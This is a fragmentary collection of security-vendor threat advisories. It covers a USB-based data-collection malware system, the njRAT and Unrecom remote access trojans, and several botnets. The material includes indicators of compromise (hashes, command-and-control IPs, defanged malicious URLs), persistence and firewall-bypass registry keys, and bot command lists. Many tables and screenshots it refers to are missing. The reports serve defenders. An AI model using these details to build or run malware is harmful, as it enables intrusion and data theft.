As for crystal balls : no one knows what the next cyber attack will look like .
But considering recent trends , we can make a few educated guesses .
Here are five factors that could change the world 's cyber security landscape in the near- to medium - term : 1 .
Outage of national critical infrastructure : we know that cyber attacks can disrupt government networks , but most current cases simply do not rise to the level of a national security threat .
Stuxnet- and Iran 's alleged retaliation against Saudi Aramco - has shifted the thinking on cyber war from theory to something closer to reality .
But have we seen the limit of what cyber attacks can achieve , or could cybercriminals threaten public safety by downing a power grid or financial market ? 2 .
Cyber arms treaty : if world leaders begin to view cyber attacks as more of a liability than an opportunity , they may join a cyber arms control regime or sign a non - aggression pact for cyberspace .
However , arms control requires the ability to inspect for a prohibited item .
President Reagan 's favorite Russian proverb was доверяй , но проверяй , or `` trust but verify .
It encompasses Daniel Ellsberg , Chelsea Manning , and Edward Snowden , as well as the Declaration of Independence , Enigma , and The Onion Router ( TOR ) .
Today , politicians , spooks , and hippies are all aware of a critical debate on the horizon - just how much online privacy should we have ? 4 .
New actors on the cyber stage : the revolutionary nature of computers and the amplification power of networks are not exclusive to the world 's largest nations .
Iran , Syria , North Korea , and even non- state actors such as Anonymous have employed cyber attacks as a way to conduct diplomacy and wage war by other means .
Researchers have little reason to think that other governments are not active in this domain .
Possible candidates could be : a. Poland : it was the Poles who first broke the German Enigma cipher - way back in 1932 ! Today , with programming talent and well - known rivalry with Russia , it is a possibility .
Stronger focus on evasion : as we have seen , some nation - states know how to launch stealthy cyber attacks .
But as the discipline of cyber defense matures , and as public awareness of the World War C phenomenon grows , some `` noisy '' cyber attackers such as China may be forced to raise their game by trying to fly under a more finely tuned radar .
The analysis and conclusions drawn in this paper are conjectural .
Cyber security , cyber espionage , and cyber war are new and rapidly evolving concepts .
Furthermore , most computer network operations are shrouded in secrecy .
Deception is a given .
With this in mind , we hope that an awareness of this World War C dynamic helps cyber security professionals better understand , identify , and combat cyber attacks in the future .
These highly sophisticated cyber attacks easily circumvent traditional signature - based defenses , such as next - generation firewalls , IPS , anti - virus , and gateways .
The FireEye Threat Prevention Platform provides real - time , dynamic threat protection without the use of signatures to protect an organization across the primary threat vectors , including Web , email , and files and across the different stages of an attack life cycle .
The core of the FireEye platform is a virtual execution engine , complemented by dynamic threat intelligence , to identify and block cyber attacks in real time .
The General Dynamics Fidelis Cybersecurity forensics team analyzed several related malware samples that together provide a sophisticated mechanism to gather data from individual computer systems .
The malware appears to be part of a system that may be optimized for use by an insider agent and/or for collecting data from disparate networks or air-­‐gapped systems .
The malware includes features to clean up after itself by deleting key indicators that it was present .
The malware system apparently includes additional components that have not been identified .
These components would potentially perform additional command and control functions and potentially exfiltration from the central host .
The sophistication of the malware and the effort involved in its development would indicate that it was developed for a high value target .
However , the specific targeting of this malware is not clear at this time .
We are concerned that while the malware system was probably developed for a specific target or family of targets , it could be employed with little adaptation against virtually any target .
This threat advisory describes the functionality of the three malware files to include command inputs and the resulting behavior of the malware .
The Fidelis XPS™ advanced threat defense system has been updated with rules to detect various components of this malware system .
However , the fact there are still unanswered questions about the components of the malware system and its intended targeting , emphasizes the importance of employing that best practices such as denying use of removable media on sensitive systems and disabling autorun ! This is particularly true for systems that are not protected by Fidelis XPS .
Additional reverse engineering and analysis is on-­going at this time .
On 8 Jan 2014 , The Fidelis Network Defense and Forensics team received three files : netsat.exe , netui3.dll and winmgt.dll .
All three files were 32 bit executable files .
Preliminary analysis disclosed netsat.exe would terminate when run if the system date was on or after 21 Jun 2013 .
The submitted files appeared to represent two parts of a suspected data collection scheme .
Essentially , netsat.exe appeared to operate as a master program that infected removable media connected to the system whereon it was running and collected data from infected drives when the drives returned .
The infection was in the form of a renamed netui3.dll or winmgt.dll file along with an Autorun.inf file set to run the renamed netui3.dll/winmgt.dll when the infected drive was connected to a target host .
There could be many iterations of netsat.exe running on enterprise or targeted entity systems .
Based on available analysis results , netsat.exe could collect surreptitiously gathered data from any infected drive connected to the system whereon netsat.exe was running , e.g. , the infected drive would not have to be processed by the same system whereon it became infected .
Data , in the form of files , destined for exfiltration may be obfuscated via a custom XOR operation .
The gathered data would ostensibly be exfiltrated via other means .
Some components of the malware 's behavior are possibly remarkable .
Quickly considering these results in cursory questions reflected as follows : • Command and Control ( C2 ) appears to be accomplished via providing commands in an encrypted file stored on the local ' master ' system ( re : netsat.exe ) .
This C2 scheme would seem to dictate : o Intruder remote access to the ' master ' system o Intruder local access to the ' master ' system o a C2 delivery / retrieval component , such as another piece of code that downloads a C2 file • Available information precludes determination of the means of exfiltration .
This possibility suggests : o Intruder remote access to the ' master ' system o Intruder local access to the ' master ' system o An exfiltration mechanism in the form of another piece of code Scanning with several select third party malware detection applications resulted in zero detections .
Cursory online research disclosed a file named netui3.dll was possibly submitted to VirSCAN.org on or before 2 Dec 2013 .
The name netui3.dll appears to have been used for malware in the past and was likely associated with a backdoor .
The name may be a play on the name netui2.dll , a legitimate Windows file name .
All three submitted files compared the system date and time to hard coded dates upon execution .
If the system date was after the hard coded dates , the malware would delete itself and terminate .
The following table illustrates the hard coded dates in relation to the affected files ' PE dates : The following version information was recorded in the netsat.exe executable : The Language / Code Page code 1033 denotes U.S. English .
This versioning information appears contrived .
However , it looks convincing enough to pass cursory inspection , i.e. , the format appears legitimate and the appearance does not engender suspicion .
Cursory online searches failed to disclose what , if anything Cdto might be associated with .
Scanning disclosed the file contained a function possibly associated with TEAN encryption .
This appeared to indicate TEA ( Tiny Encryption Algorithm ) involvement .
The presence of the following files may indicate netsat.exe , et al , involvement : The presence of the following , specifically on removable media , may indicate netsat.exe , et al , involvement : Cursory analysis did not disclose entrenchment data , such as a Registry entry to ensure persistence .
This cursory analysis disclosed no network artifacts specific to the malware 's operation .
However , evidence of any of the files involved ( MD5 , strings , file names ) traversing the network , e.g. , on the move , may be indicative of netsat.exe , et al presence .
Given what was revealed during this cursory analysis , finding string and or hash artifacts in SMB traffic seemed the most likely possibility with regard to network detection .
Versioning is possible .
For example , the submitted netui3.dll sample may not match the submitted netsat.exe sample in terms of versioning .
However , analysis assumed , for the sake of efficiency , that the submitted netui3.dll and submitted netsat.exe file were associated .
The submitted winmgt.dll file appeared very similar to netui3.dll .
However , some differences suggested the two files represented disparate versions .
Analysis disclosed date sensitivity built into the submitted files .
If the sample was run after a particular date , it would effectively terminate and delete itself : Analysis disclosed netsat.exe probably serves as the headquarters of malicious activity by : Analysis disclosed netui3.dll/winmgt.dll probably serve as the field units of malicious activity by : The following commands and their descriptions , listed by executable file , illustrate the submitted malware 's functionality : This advisory is based on preliminary information .
It is important to note that reverse engineering and analysis of the malware system is still underway .
We expect to provide additional data , and some of this information may change as a result of continued research .
However , due to the unique functionality of malware system and its potential for employment against targets beyond the initially intended victim , the network security community should be concerned and track this malware closely .
In June 2013 , we released a paper containing information about the njRAT malware that included its functionality , indicators of compromise , and campaign codes used on the variants we had identified .
To this day , we continue to observe waves of blunt phishing attacks from compromised hosts in the Middle East , showing threat actors using multiple tools ( including njRAT , AdwindRAT , Xtreme RAT , and H - Worm ) in clustered phishing attacks against the same targets .
Some of these attacks continue to target the U.S. telecommunications sector with threat actors sending phishing emails using business - oriented lures containing the aforementioned tools or links to websites that serve these tools .
Additionally , we continue to directly observe significant activity from threat actors sending commands to the victim systems in the Middle East .
Further , we are observing attackers using the following obfuscators to make detection of this malware specimen more difficult for security analysts : -­‐ .NetShrink
Reactor ( http : //www.eziriz.com/ ) This document provides details of the njRAT campaign codes used , versions , ports , and CnC nodes currently observed sending commands to victim systems .
It 's also clear that threat actors are actively using the following version of njRAT : 0.3.6 , 0.4.1a , 0.5.0E , 0.6.4 .
Among other things , with this access , the attacker could start scanning other systems in the victim network to perform lateral movement .
The following table contains information about the observed CnC nodes , ports , campaign codes , and njRAT versions : It 's clear from this paper that there continues to be considerable global activity involving threat actors using njRAT and associated tools .
We 're publishing these indicators so that others in the security research community can monitor for this activity and potentially correlate against other campaigns and tools that are being investigated .
Fidelis XPS™ detects all of the activity documented in this paper .
The Fidelis Threat Research Team will continue to actively monitor the ever - evolving threat landscape for the latest threats to our customers ' security .
Previous General Dynamics Fidelis Cybersecurity Services ( Fidelis ) reporting , ref : Fidelis Threat Advisory ( FTA ) # 1011 dated 15 Jan 2014 , introduced a malware system comprised of multiple files that provided a means for intruders to discover and retrieve data from disparate computer systems via removable storage devices .
The malware system consists of at least two Portable Executable ( PE ) files , one acting as a headquarters component and one acting as field unit or agent component .
The headquarters component infects drives connected to its host system with the field unit component and retrieves data from the field unit on the infected drive 's return to the headquarters host system .
The field unit conducts reconnaissance and data collection in accordance with particular commands .
Continuing analysis solidified the headquarters component 's Command and Control ( C2 ) scheme .
The malware receives commands from a locally stored encrypted file .
This report describes select malware functionality with some granularity , provides extended detail regarding the headquarters component 's C2 functionality , provides additional means of defensive detection of this malware and describes some interesting aspects of the malware as a whole .
Previous reporting , ref : Fidelis Threat Advisory ( FTA ) # 1011 dated 15 Jan 2014 , introduced a malware system comprised of multiple files that reflected a means for intruders to discover and retrieve data from disparate computer systems via removable storage devices .
Analysis of the system relied on the availability of two files named netsat.exe and netui3.dll .
Previous reporting likened netsat.exe as a headquarters application and netui3.dll as a field unit with the following basic functionality : The following graphic serves to illustrate a possible basic theory of operation given available data : File Name : netui3.dll File Size : 39424 bytes MD5 : 68aed7b1f171b928913780d5b21f7617 Continued analysis disclosed details regarding the field unit / agent application .
The following reflects observations during field unit execution from an infected external drive : File Name : netsat.exe File Size : 43520 bytes MD5 : eb8399483b55f416e48a320d68597d72 Previous analysis results indicated netsat.exe retrieved commands from an encrypted file named netwn.drv resident in the CSIDL_WINDOWS\msagent\ directory .
The encryption was a Tiny Encryption Algorithm ( TEA ) implementation that used a key that was modified during encryption and decryption operations .
The following command file hex editor excerpt illustrates the command file 's obfuscation in a contrived instance : Analysis efforts did not have access to ' command ' files retrieved from the victim systems for either the headquarters or the field unit applications .
However , using the malware 's behavior and determining the command file 's format via reverse engineering afforded the ability to test numerous assumptions about the malware 's intended use .
Analysis determined the command format was : drive identification followed by one or more command and parameter strings .
The following table reflects testing and theoretical contents of command files driving netsat.exe operation : The Following Are Hypothetical Scenarios Designed to Illustrate Possible Employment Options Possible Commands One -­ Targeting Specific Devices ( Known to Intruder From Previous netsat / netui3 Activity ) Possible Commands Two -­ Maximizing Propagation ( Theoretical ) The headquarters component ( netsat.exe ) logs certain events in a file located at CSIDL_MYPICTURES\wins .
Analysis indicates the log file is probably stored in the clear , i.e. , the contents are not obfuscated .
Example log file contents are presented as follows : The following strings , which are not all inclusive or exclusive , could be used to find log files , fragments or contents on devices and on a network : Previous and continuing analysis results indicated some interesting and/or relevant aspects of this malware : The following interesting questions / assumptions emerged from previous cursory analysis of this malware : Further analysis confirms the malware 's use of an encrypted file stored on the system whereon the malware is executing without an apparent means of automatic generation .
This continues to suggest that intruders either have local or remote access to headquarters systems running netsat.exe or access to another application that automates remote C2 data / file retrieval .
Intruders ' apparent ability to distinguish between particular field unit vehicles ( infected drives ) , ref : Possible Commands One -­ Targeting Specific Devices ( Known to Intruder From Previous netsat / netui3 Activity ) from Hypothetical command table , suggests active engagement with the malware and targets .
This report is based on information extracted from reverse engineering and analysis of two PE files .
There are other components and artifacts of this malware that are currently inaccessible to Fidelis analysts .
Therefore , analysts extrapolated some of the behavior presented here .
While analysts are confident about behaviors described to date , there could certainly be additional behaviors and nuances heretofore unseen .
Analysis of this malware continues to suggest that a sophisticated effort was behind its creation and employment .
Actors went to great lengths to make the malware efficient and effective while building in obfuscation and complexity .
Interesting artifacts and observations continue to be discovered and made , such as the malware 's apparent expiration , the interesting naming convention for a directory to hold collected data , and the actors ' apparent intention to avoid certain networks or network addressing schemes .
Analysis continues and any relevant additional information will be reported as soon as practicable .
In the past thirty days ( 30 ) an increase attack activity has been observed using the `` njRAT '' malware .
This remote access trojan ( RAT ) has capabilities to log keystrokes , access the victim 's camera , steal credentials stored in browsers , open a reverse shell , upload / download files , view the victim 's desktop , perform process , file , and registry manipulations , and capabilities to let the attacker update , uninstall , restart , close , disconnect the RAT and rename its campaign ID .
Through the Command & Control ( CnC ) server software , the attacker has capabilities to create and configure the malware to spread through USB drives .
Phishing attack or Drive - by download ) .
It has also been observed that attackers are delivering `` njRAT '' embedded in other applications ( i.e .
L517 v.0.994 Word List Generator ) , and compressed with EZIRIZ .NET
Obfuscation with the use of compressors or protectors is a technique used by attackers to prevent detection by network- based and host - based security defenses .
We have observed the majority of the attacks leveraging `` njRAT '' to be against organizations based in or focused on the Middle East region in the government , telecom , and energy sectors .
However as this is a publicly available tool it can be attained and deployed with ease regardless of location or industry .
During the analysis of `` njRAT '' , it was observed that some of the top antivirus vendors were not currently detecting some variants of this threat .
Some of the file names of carrier files or njRAT samples observed were : L517 v0.994.exe , RealUpgrade.exe , password hotmail cracker 2013.exe , elisa.exe , Crack All Games.exe , fresh cc Users are granted permission to copy and/or distribute this document in its original electronic form and print copies for personal use .
This document can not be modified or converted to any other electronic or machine - readable form in whole or in part without prior written approval of Fidelis Security Systems , Inc .
While we have done our best to ensure that the material found in this document is accurate , Fidelis Security Systems , Inc. makes no guarantee that the information contained herein is error free .
This document will provide detailed information about the njRAT 's functionality , file system indicators , network indicators , some of the campaign IDs observed , MD5 hashes , and domains .
It will also go over a detailed analysis of one of the malware variants .
The `` njRAT '' is a robust remote access trojan that once it reaches and infects the end - point , allows the attacker to have full control over the Victim system .
With this access , the attacker can start scanning other systems in the victim network to perform lateral movement .
We will start this section by performing analysis on the following `` njRAT '' sample : - Filename : Authorization.exe - MD5 : 1d3baedd747f6f9bf92c81eb9f63b34b The `` Authorization.exe '' njRAT malware was embedded and dropped in the victim system by the following file : `` Authorization form may - 2013 - 115444.scr '' ( MD5 : 63781fe1932e612c6c29225d25515111 ) .
The next section ( Indicators & Mitigation Strategies ) , will provide information about other variants of the malware obtained .
The `` Authorization.exe '' malware sample was created with version V.0.5 of this RAT .
The njRAT application was developed with VB.NET ( Visual Basic .NET
When the malware connects to the Command & Control ( CnC ) server , the attacker is able to perform the following actions from the njRAT CnC server GUI : The following is a screenshot of the `` njRAT '' v.0.5 CnC GUI when a Victim system connects to it : The following `` About '' information was observed in this version ( 0.5.0 ) of the C2 server software found online : The following screenshot shows the Builder interface and default parameters : The `` Authorization.exe '' malware has keylogger functionality .
It stores the logged keystrokes in the following file : `` [ CWD ] \.tmp '' .
When the malware is dropped by the `` Authorization form may - 2013 - 115444.scr '' carrier file , the logged keystrokes are stored in : `` C : \Extracted\.tmp '' .
The IP address used by the Command & Control ( C2 ) node appears to be under an IP range owned by : `` Palestinian Internet Services , P. O .
Variants of this malware have been observed by the community since at least 2012 .
The malware appears to be known by the community as : njRAT , MSIL / Bladabindi , and Backdoor . LV .
When the `` Authorization.exe '' malware is executed it : - Creates a copy of itself in the following locations : o % APPDATA % \msnco.exe o C : \Documents and Settings\ % USERNAME % \Start Menu\Programs\Startup\b6554e5bcfef391ff7a7ffda58092e10.exe - Tries to open the following file : [ CWD ] \ Authorization.exe.config - Entrenches in the system for persistence in the following registry locations : o HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Ru n\b6554e5bcfef391ff7a7ffda58092e10 o HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\R un\b6554e5bcfef391ff7a7ffda58092e10 Makes the following modifications to the registry to bypass the Windows Firewall : o Key : HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SharedAcc ess\Parameters\FirewallPolicy\StandardProfile\AuthorizedApplic ations\List\ [ % APPDATA % ] \msnco.exe o Value : [ % APPDATA % ] \msnco.exe : * : Enabled : msnco.exe - Beacons to the following C2 node over TCP port 1177 : `` 217.66.231.245 '' The attacker tries to make sure the malware will run in the system by making the second copy into the above mentioned directory ( C : \Documents and Settings\ % USERNAME % \Start Menu\Programs\Startup\b6554e5bcfef391ff7a7ffda58092e10.exe ) o This causes the malware to execute again when the system is rebooted and re - starts the infection in the system .
Once the system is infected again , it will beacon to the C2 node .
The attacker tries to trick the user by using different icons for the malware .
Various samples were observed with MS Word and PDF icons .
The following is a screenshot of how the file will look like to a normal user : When the system is configured to show file extensions , the EXE extension is now revealed : When the malware connects to the C2 node , it will send information about the victim system , malware version , open windows , etc .
The following is the network traffic observed : The following table provides information of some of the fields observed in the network traffic : Information sent by the attacker on opened windows in the system could inform him / her of his malware being analyzed and allowed to connect to the C2 node .
For example , if Wireshark , Filemon , Regmon , and IDA are opened in the system when the analyst executes the malware , this will quickly let the attacker know that someone is performing reverse engineering of his malicious code .
The following WHOIS information was found related to the C2 node ( 217.66.231.245 ) : The `` Authorization.exe '' variant in this report appears to have been available at some point through the following URL : `` hxxp : //bongdacongdong.vn / authorization.exe '' .
The domain currently resolves to the following IP address : `` 112.213.89.144 '' , but at some point , the domain was associated with the following IP address : `` 31.170.165.90 '' .
The following information was found at Virustotal for `` 31.170.165.90 '' : - Passive DNS replication The following domains resolved to the given IP address : 2013 - 04 - 18 abilkart.p.ht 2013 - 04 - 22 alexis.id1945.com 2013 - 04 - 27 aw.nation-sim.net 2013 - 06 - 04 bongdacongdong.vn 2013 - 04 - 11 cs-viewer.ru 2013 - 06 - 26 dota2mail.hol.es 2013 - 05 - 07 download.mikroonur.tk 2013 - 06 - 27 express.vv.si 2013 - 04 - 16 forumteam.ru 2013 - 04 - 25 hs.nation-sim.net - Latest detected URLs Latest URLs hosted in this IP address detected by at least one URL scanner or malicious URL dataset : 3/38 2013 - 06 - 09 08:16:23 hxxp : //www.saldo - dobrado.id1945.com / sodexo2013/dobro.htm 2/38 2013 - 06 - 05 15:15:03 hxxp : //yandload.besaba.com/ 3/38 2013 - 06 - 04 02:08:18 hxxp : //bongdacongdong.vn / authorization.exe 4/38 2013 - 05 - 30 21:34:09 hxxp : //yandload.besaba.com / index.php ? f = rubinrot.exe 5/39 2013 - 05 - 24 17:36:28 hxxp : //indonesiancode.p.ht/ 2/36 2013 - 05 - 10 04:50:52 hxxp : //yandload.besaba.com / index.php % 3F 2/37 2013 - 04 - 30 05:06:15 hxxp : //yandload.besaba.com / index.php % 5B % 2A % 2Aqmark % 2A % 2A % 5D 2/37 2013 - 04 - 29 22:23:55 hxxp : //php6.besaba.com / install_flashplayer11x32_mssd_aih.exe 2/36 2013 - 04 - 27 09:14:33 hxxp : //aw.nation - sim.net / ips_kernel / sabre / Sabre / DAV / FS / option.php 1/36 2013 - 04 - 22 21:56:09 hxxp//alexis.id1945.com/ - First submission : 2013 - 05 - 28 at 00:12:24 File Name : Authorization.exe File Size : 110080 bytes MD5 : 1d3baedd747f6f9bf92c81eb9f63b34b SHA1 : 328c12ba3e6e99e63968b066455b7575e7ee862b PE Time : 0x5197ACE1 [ Sat May 18 16:31:29 2013 UTC ] PEID Sig : Microsoft Visual C # / Basic .NET
Sections ( 4 ) : Name Entropy MD5 .text
The first table contains the MD5 hash , size , domain , port , njRat version , and campaign ID .
The second table contains information about the file system artifacts ( kelogger file location , files created ) .
The third table contains information about registry key entrenchment for persistence .
Then , a list of network indicators will be provided to assist network defenders with the creation of signatures to be deployed to the sensors .
The following will present the network traffic observed when different options were selected from the `` njRAT '' C2 server GUI ( YELLOW = Data sent by C2 .
These artifacts will hopefully assist the research community with generation of network signatures to detect this threat : The following table provides information about some of the encoded data which is files and directories in the folder browsed .
In this case , an application called BinText ( bintext.exe ) was selected in the Attacker 's Machine .
This application was executed in the Victim 's machine .
The Victim system responded with the name of the new window opened : The other portion of the traffic between the text `` TRUNCATED BY THE EXAMINER '' is the encoded executable ( BinText ) uploaded to the Victim system .
Basically , the response from the directory listing ( date , time , file size , and file name ) is sent back to the attacker in Base64 encoded format .
The encoded data sent by the Victim system was the keystrokes collected into the keylogger file in the Victim .
The data decodes to : Fidelis XPS sensors detect the `` njRAT '' malware variants and domains observed throughout this report .
Fidelis XPS sensors detected the NJC242.exe / njRAT malware as `` Trojan . Win32.Jorik . Agent.rkp '' .
Fidelis XPS is capable of detecting this threat regardless of delivery method employed by the Threat Actors responsible .
Fidelis XPS can detect and alert on executables such as the `` njRAT '' malware multiple layers deep inside of archive files ( i.e .
The Fidelis Threat Research and Network Forensics and Incident Response teams will continue to actively monitor the ever - evolving threat landscape for the latest threats to our customers ' network security .
In the past two weeks , we have observed an increase in attack activity against the U.S. state and local government , technology , advisory services , health , and financial sectors through phishing emails with what appears to be a remote access trojan ( RAT ) known as Unrecom .
The attack has also been observed against the financial sector in Saudi Arabia and Russia .
The following is a screenshot of the Unrecom RAT v.2.0 ( Version in Spanish ) : Over time , various reports in the community have documented the evolution of this tool .
This evolution is to be expected , but its low detection rate , recent use this month through phishing emails campaigns against multiple sectors in the U.S. and association with past campaigns involving a variety of RATs captured our attention .
The evolution of Unrecom RAT dates from its beginnings as a tool known as Frutas RAT , subsequently branded as Adwind RAT , and now Unrecom RAT .
In 2013 , it was reported that Frutas RAT was used in phishing email campaigns against high profile 2 companies in Europe and Asia in sectors such as finance , mining , telecom , and government .
Unrecom RAT provides the attacker with full control over the compromised system , once infected .
It has some of the following capabilities : In the past , variants of the DarkComet and AcromRAT malware have also been observed beaconing to the same Command & Control ( CnC ) servers used by the Unrecom RAT in this campaign .
This document will provide information about the recent phishing campaigns observed with this RAT and some of the network indicators .
The increased threat activity against the U.S. state and local government , technology , advisory services , and health sectors in the past two weeks is of great concern to us as it is being carried through phishing emails with what appears to be a tool known as Unrecom RAT .
The phishing emails try to trick the users into thinking the emails are legitimate by attaching the RAT with the some of the following names : Payment Invoice.jar , Payment details.jar , POR # 94586.zip/POR # 94586.jar , INV # 94586.zip/INV # 94586.jar , Invitation.jar , reports-pdf.jar , US $ 25k.jar , and DBC_BANK_IMG_23456_156.jar , and lremit_Transfer_Error_Page.jar .
Some of the email message subjects observed during this campaign are : It appears that the latest version of this RAT is 3.2 and is being sold at `` unrecom [ .
We find it interesting that on their website , the authors of this software recommend Unrecom RAT buyers to not scan created servers ( malware deployed to Victim systems ) at Virustotal nor Metascan .
This is indicative of the adaptive , counter - intelligence techniques being adopted as threat actors become aware that many security researchers use these services to gather threat intelligence .
A remote access tool provides an attacker with full control over the victim system .
Once a system has been compromised , the attacker may install one or more backdoors .
These backdoors provide a persistent foothold , using a separate command and control channel ; allowing future access less likely to be correlated to the original activity .
Through its modular plugin framework , this particular tool lets the attacker obtain System Information ( e.g .
The following will present detailed information about some of the phishing emails observed and the attached malware : The `` Invitation.jar '' malware was sent in a phishing email that contained some of the following details : The following is a screenshot of the email : The `` Invitation.jar '' malware beaconed to `` magnumbiz.no-ip [ .
The `` Payment details.jar '' malware was sent in a phishing email that contained some of the following details : The following is a screenshot of the email : The `` Payment details.jar '' malware beaconed to `` morechedder.no-ip [ .
The `` reports-pdf.jar '' malware was sent in a phishing email that contained some of the following details : The following is a screenshot of the email : The `` reports-pdf.jar '' malware beaconed to `` 184.22.201 [ .
The `` US $ 25k.jar '' malware was sent in a phishing email that contained some of the following details : The `` US $ 25k.jar '' malware beaconed to `` toba.no-ip [ .
The `` Payment Invoice.jar '' malware was sent in a phishing email that contained some of the following details : The `` Payment Invoice.jar '' malware beaconed to `` greengreen1.no-ip [ .
The `` INV # 94586.jar '' malware was sent in a phishing email that contained some of the following details : The `` INV # 94586.jar '' malware beaconed to `` 192.95.21 [ .
The `` DBC_BANK_IMG_23456_156.jar '' malware is a corrupted file , but it was sent in a phishing email that contained some of the following details : The following is a screenshot of the email : The `` lremit_Transfer_Error_Page.jar '' malware was sent in a phishing email that contained some of the following details : The following is a screenshot of the email : `` Iremit Transfer Error Page '' , in the above email , has a link pointing to `` http : //radaxis [ .
One simple example of how the emails in this phishing campaign are related is that the Command and Control node ( 184.22.201 [ .
Beginning at the top of the diagram and working down , on the left side of the diagram are two phishing emails , the details of which are referenced in the pages above as item numbers 2 & 3 .
Of note , these phishing emails were sent to users at two separate and unrelated organizations .
As you can see , when compared to each other , these messages appear completely unrelated , other than the fact they both contain jar files that are sophomorically `` obfuscated '' as pdf.jar files .
Note that both the subjects , `` Transfer investigation report '' and `` Confirm transactions before release '' are comparatively unique as are the senders , `` Police Department '' cmmds @ sbt.co [ .
In addition to the fact that the emails share no attributes , the malicious attachments are also unrelated .
Finally , and of most interest in this diagram , the central node at the bottom of the diagram , represents the Command and Control node ( 184.22.201 [ .
While this shared resource is noteworthy , of particular interest is that it has also been used in other campaigns .
This paper seeks to highlight this campaign targeting significant enterprises worldwide , utilizing a Java- based RAT malware that is currently detected by a small set of security tools .
We are publishing these indicators so that others in the security research community can monitor for this activity and potentially correlate against other campaigns and tools that are being investigated .
Fidelis XPS™ , the Advanced Threat Defense solution from General Dynamics Fidelis Cybersecurity Solutions detects all of the activity documented in this paper .
The Fidelis Threat Research Team will continue to follow this specific activity and actively monitor the ever - evolving threat landscape for the latest threats to our customers ' security .
Adwind RAT Rebranding , Nov 2013 : http : //www.crowdstrike.com / blog / adwind - rat- rebranding / index.html 2 .
Targeted Attacks Delivering Fruit , Aug 2013 : http : //www.symantec.com / connect / blogs / targeted- attacks - delivering - fruit 3 .
Remote Access Tool Takes Aim with Android APK Binder , Jul 2013 : http : //www.symantec.com / connect / blogs / remote - access - tool - takes - aim - android - apk - binder 4 .
Old Java RAT Updates , Includes Litecoin Plugin , Apr 2014 : http : //blog.trendmicro.com / trendlabs- security - intelligence / old - java - rat - updates - includes - litecoin - plugin/ 5 .
Cross - Platform Frutas RAT Builder and Back Door , Feb 2013 : http : //www.symantec.com / connect / blogs / cross - platform - frutas - rat - builder - and - back - door 6 .
In the recent past , a Fidelis XPS user reported seeing detections of what appeared to be botnet - related malware .
While that customer was protected , we at General Dynamics Fidelis Cybersecurity Solutions decided to take a closer look .
The analysis of the malicious code revealed that it appeared to be Andromeda but the delivery infrastructure looked interesting .
Further telemetry from our sensors showed that this server in China was also hosting and distributing many other malicious specimens .
Analysis of the data revealed a pattern in the filenames .
Our analysts used this pattern to discover other systems distributed across the globe serving up various botnet malware , so far assumed to be used in distinct campaigns but clearly related in this case : - Andromeda - Beta Bot - Neutrino Bot - NgrBot / DorkBot Analysis also showed how attackers continue to benefit from the use of globally - distributed hosting providers to perform their malicious activities .
Further , the analysis revealed how attackers are hosting and distributing identical copies of the malware from servers in different countries including China , Poland , Russia , and the United States .
For the period of time researched in this activity , we observed the following targeted sectors in the US : - Manufacturing / Biotechnology & Drugs - Professional Services / Engineering - Information Technology / Telecommunications - Government / State Note that our footprint is largely in the Enterprise space and it is possible that we 're seeing spillover from wider campaigns .
This document uncovers various servers hosting Bots and other related malware , provides a triage analysis of various pieces of malware hosted by these malicious servers , and provides indicators that network defenders can use to protect their networks .
The threat activity observed in the past weeks against various targets in our customer base has shown patterns that allowed us to discover multiple servers hosting and distributing malicious software ( Bots ) .
As it is known by the network defenders and the security community , it is important to defend against these attacks since systems infected with these malicious specimens could be used for credential theft , Distributed Denial of Service Attacks , spreading malware , lateral propagation , etc .
This is of great concern as the first stage attack continues to bypass network security defenses infecting user 's computers that beacon to malicious servers to download or create the second stage malware into the victim systems .
Some of the main Bot types of malware detected through this research include : -­‐ Andromeda Andromeda is a modular bot that downloads modules and updates from its command and control ( C & C ) server during execution .
The malware has both anti - VM and anti - reversing features .
Its code is obfuscated to make it more difficult for malware reverse engineers to analyze and antivirus tools to detect .
Andromeda bot features include : self - propagation , injection into trusted processes to hide itself , network traffic encryption , download and installation of files / malware , form grabber , keylogger , ring3 rootkit , proxy , etc .
Features like form grabber , rootkit , and proxy are delivered to the malware in the form of modules that are then loaded into the victim system after the malware makes a connection with its C & C .
It appears that in 2012 , some of the modules were sold for $ 500 ( form grabber ) , $ 300 ( Ring3 rootkit ) , and $ 200 ( keylogger ) .
The bot includes the following features : process injection , hard drive wiping , etc .
Different from NgrBot , DorkBot uses modified IRC commands .
Some of the commands supported include : ! die , ! dl , ! http.inj , ! logins , ! rc , ! speed , ! ssyn , ! stop , ! up , and ! udp .
It has capabilities to join different IRC channels to perform various attacks according to the IRC - based commands from the C & C server .
Its code is obfuscated to make it more difficult for malware reverse engineers to analyze and antivirus tools to detect .
Some of the commands supported are : ~pu , ~dw , ~http.inj , ~logins , ~rc , ~speed , ~ssyn , ~stop , and ~udp .
The Bot is also known by some security vendors as ' Trojan . Neurevt ' .
Its code is obfuscated to make it more difficult for malware reverse engineers to analyze and antivirus tools to detect .
Beta bot features include : anti - VM and anti - reversing , self - propagation , rootkit , process injection , blocking access to multiple antivirus / security vendor websites , AV - disabling , form grabbing , download and execution of files , termination of competing malware communications by terminating their processes or blocking their code injections , and denial of service .
It appears that in May 2013 , the pre - built bot could be purchase for $ 320- $ 500 , and $ 20 for variant rebuilds for those requiring configuration changes .
According to online research , Beta Bot sales are being handled by `` Lord Huron , '' although `` betamonkey '' appears to be the author .
The following image was found during online research : -­‐ Neutrino The Neutrino bot was advertised as an HTTP stress - testing tool .
It has some of the following features : anti - VM and anti - reversing / debugging , denial of service ( HTTP / TCP / UDP flood ) , keylogger , command shell , credential stealing , self - spreading , etc .
It appears at some point the bot was sold for $ 550 ( Builder ) , $ 200 ( Full set including Bot and Admin Panel ) , and $ 20 ( Update ) .
Online research revealed the following contact information for this bot : n3utrino @ kaddafi [ .
The following images were found during online research : The following table provides information about some of the servers hosting and distributing malware and some of the filename patterns discovered : The following table provides information about the relationship between the malicious servers , detection names by antivirus tools , and vertical market affected ( based on unique hashes and detections ) : A bot malware has features like anti - reversing , credential stealing / keystroke logging / form grabbing , DNS changer , process injection , antivirus process killing , blocking of security related websites , backdoor , and others .
They also have features to spread themselves through USB removable drives , social networking sites , and messaging clients .
In addition , they could also infiltrate the network when the victim user visits a website hosting a browser exploit .
Once the attacker gains control , the infected system could be used to launch Distributed Denial of Service attacks , spread the bot to other victims , download more advanced malware to perform lateral propagation , etc .
The attackers ( Bot Masters / Herders ) could also rent their botnets to other cybercriminals .
